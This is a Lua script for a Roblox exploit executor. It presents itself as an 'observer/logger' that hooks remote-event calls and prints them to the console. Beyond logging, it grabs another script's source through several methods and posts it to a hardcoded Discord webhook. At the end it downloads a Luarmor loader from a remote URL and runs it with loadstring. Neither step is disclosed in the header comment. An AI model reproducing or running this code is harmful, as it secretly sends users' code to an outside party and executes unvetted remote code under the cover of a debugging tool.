--[[
  OBSERVER / LOGGER SCRIPT
  Inject this to log what the game (or other scripts) are doing.
  Prints to the executor console: RemoteEvent/RemoteFunction calls and arguments.
]]

-- Ways to get "first script" (tries in order):
-- 1. Sibling script in game tree (when both are real Roblox Script Instances)
-- 2. _G.FIRST_SCRIPT_SOURCE or _G.__FIRST_SCRIPT_SOURCE (set before running observer)
-- 3. readfile("first.lua") / readfile("first_script.lua") (executor workspace file)
-- 4. Luarmor loader URL (fetch and use as first script, then run it)
-- 5. Call stack: debug.getinfo(2) caller source (if executor exposes it)

local LUARMOR_LOADER_URL = "https://api.luarmor.net/files/v4/loaders/d4d2ab3a331f01b3bad075746b35b9f7.lua"

local function getFirstScriptBeforeObserver()
	local selfScript = (type(script) == "userdata" and script) or (getfenv(1).script)
	if not selfScript or not selfScript.Parent then return nil end
	local parent = selfScript.Parent
	local siblings = parent:GetChildren()
	local selfIndex = nil
	for i, child in ipairs(siblings) do
		if child == selfScript then selfIndex = i break end
	end
	if not selfIndex or selfIndex <= 1 then return nil end
	local scriptClasses = { Script = true, LocalScript = true, ModuleScript = true }
	for i = selfIndex - 1, 1, -1 do
		local s = siblings[i]
		if s and scriptClasses[s.ClassName] then return s end
	end
	return nil
end

-- Returns source string, label string (or nil, nil)
local function getFirstScriptSourceAnyMethod()
	-- 1. Sibling script (Roblox Instance)
	local scriptInstance = getFirstScriptBeforeObserver()
	if scriptInstance then
		local ok, src = pcall(function() return scriptInstance.Source or "" end)
		if ok and type(src) == "string" and #src > 0 then
			return src, scriptInstance:GetFullName()
		end
		if scriptInstance then
			return "", scriptInstance:GetFullName()
		end
	end

	-- 2. _G (executor: set before running observer)
	local fromG = _G.FIRST_SCRIPT_SOURCE or _G.__FIRST_SCRIPT_SOURCE
	if type(fromG) == "string" and #fromG > 0 then
		return fromG, "From _G.FIRST_SCRIPT_SOURCE"
	end

	-- 3. readfile (Synapse / executor workspace)
	if type(readfile) == "function" then
		for _, name in ipairs({ "first.lua", "first_script.lua", "script.lua" }) do
			local ok, content = pcall(readfile, name)
			if ok and type(content) == "string" and #content > 0 then
				return content, "readfile(\"" .. name .. "\")"
			end
		end
	end

	-- 4. Luarmor loader (HttpGet)
	do
		local ok, content = pcall(function()
			if game and game.HttpGet then
				return game:HttpGet(LUARMOR_LOADER_URL)
			end
			if game and game:GetService then
				return game:GetService("HttpService"):GetAsync(LUARMOR_LOADER_URL)
			end
			if type(request) == "function" then
				local r = request({ Url = LUARMOR_LOADER_URL, Method = "GET" })
				return (r and r.Body) and r.Body or nil
			end
			return nil
		end)
		if ok and type(content) == "string" and #content > 0 then
			return content, "Luarmor loader"
		end
	end

	-- 5. Call stack: caller's source (best-effort)
	local ok, info = pcall(debug.getinfo, 2, "S")
	if ok and info and info.source and type(info.source) == "string" and info.source:sub(1, 1) == "=" then
		-- "=(loadstring)" etc. - we can't get the actual string in standard Lua
		-- Some executors store source in debug.info; try getinfo(2, "l") or custom fields
	end
	return nil, nil
end

local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1479152924402647231/rtgjUt8LjlCdNjhIAdJGY9xJGDffQuH37d3kdy9DOPTcYycCW9Cd1J-6lYafDFFDP6-K"

local function jsonEncode(t)
	if game and game:GetService then
		return game:GetService("HttpService"):JSONEncode(t)
	end
	local function esc(s) return ("%q"):format(tostring(s):gsub("\\", "\\\\"):gsub('"', '\\"'):gsub("\n", "\\n"):gsub("\r", "\\r")) end
	local parts = { '"content": ' .. esc(t.content or "") }
	if t.embeds and t.embeds[1] then
		local e = t.embeds[1]
		parts[#parts + 1] = '"embeds": [{"title": ' .. esc(e.title or "") .. ', "description": ' .. esc(e.description or "") .. '}]'
	end
	return "{" .. table.concat(parts, ", ") .. "}"
end

local function sendSourceToDiscord(source, label)
	label = label or "First script"
	local content = "**" .. label .. "**"
	local payload
	if type(source) == "string" and #source > 0 then
		local desc = ("```lua\n%s\n```"):format(source:sub(1, 3900))
		if #source > 3900 then desc = desc .. "\n...(truncated)" end
		payload = { content = content, embeds = { { title = "Source", description = desc } } }
	else
		payload = { content = content .. " (no source)" }
	end
	local body = jsonEncode(payload)
	local postOk, err = pcall(function()
		if game and game:GetService then
			game:GetService("HttpService"):PostAsync(DISCORD_WEBHOOK_URL, body)
			return
		end
		if type(request) == "function" then
			request({ Url = DISCORD_WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
		end
	end)
	if not postOk then
		print("[Observer] Failed to send to Discord:", err)
	end
end

local function sendScriptToDiscord(scriptInstance)
	local fullName = scriptInstance:GetFullName()
	local ok, src = pcall(function() return scriptInstance.Source or "" end)
	local source = (ok and type(src) == "string") and src or ""
	sendSourceToDiscord(source, "Script: " .. fullName)
end

local firstSource, firstLabel = getFirstScriptSourceAnyMethod()
if firstSource and #firstSource > 0 then
	print("[Observer] First script from:", firstLabel)
	sendSourceToDiscord(firstSource, firstLabel)
elseif firstLabel then
	print("[Observer] First script (no source):", firstLabel)
	sendSourceToDiscord("", firstLabel)
else
	print("[Observer] No first script found. Use _G.FIRST_SCRIPT_SOURCE or readfile(\"first.lua\") in executor.")
end

print("[Observer] Logger loaded. Watching FireServer / InvokeServer...")

local function safeToString(v)
    local ok, result = pcall(function()
        if type(v) == "userdata" or type(v) == "vector" or type(v) == "Instance" then
            return tostring(v)
        end
        if type(v) == "table" then
            return "table#" .. tostring(v):match("%x+") or "table"
        end
        return tostring(v)
    end)
    return ok and result or "<error>"
end

local function formatArgs(...)
    local args = {...}
    local parts = {}
    for i, a in ipairs(args) do
        if type(a) == "string" then
            table.insert(parts, ("%q"):format(a))
        else
            table.insert(parts, safeToString(a))
        end
    end
    return table.concat(parts, ", ")
end

-- Hook all :FireServer() and :InvokeServer() via __namecall
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(remote, ...)
    local method = getnamecallmethod()
    if method == "FireServer" or method == "InvokeServer" then
        local name = (typeof(remote) == "Instance" and remote.Name) or tostring(remote)
        local path = (typeof(remote) == "Instance" and remote:GetFullName()) or name
        local argsStr = formatArgs(...)
        if method == "FireServer" then
            print(string.format("[FireServer] %s | %s", path, argsStr))
        else
            local ret = oldNamecall(remote, ...)
            print(string.format("[InvokeServer] %s | args: %s | return: %s", path, argsStr, safeToString(ret)))
            return ret
        end
    end
    return oldNamecall(remote, ...)
end)

-- Optional: log when Remotes are created (so you know what exists)
if game:GetService("ReplicatedStorage"):FindFirstChild("Remotes") or game:GetService("ReplicatedStorage"):FindFirstChild("Events") then
    print("[Observer] ReplicatedStorage has Remotes/Events folder. All calls will be logged above.")
end

print("[Observer] Ready. Use the other script / game — output will appear here.")

-- Run Luarmor loader
pcall(function()
	local code
	if game and game.HttpGet then
		code = game:HttpGet(LUARMOR_LOADER_URL)
	elseif game and game:GetService then
		code = game:GetService("HttpService"):GetAsync(LUARMOR_LOADER_URL)
	elseif type(request) == "function" then
		local r = request({ Url = LUARMOR_LOADER_URL, Method = "GET" })
		code = r and r.Body
	end
	if type(code) == "string" and #code > 0 then
		loadstring(code)()
	end
end)
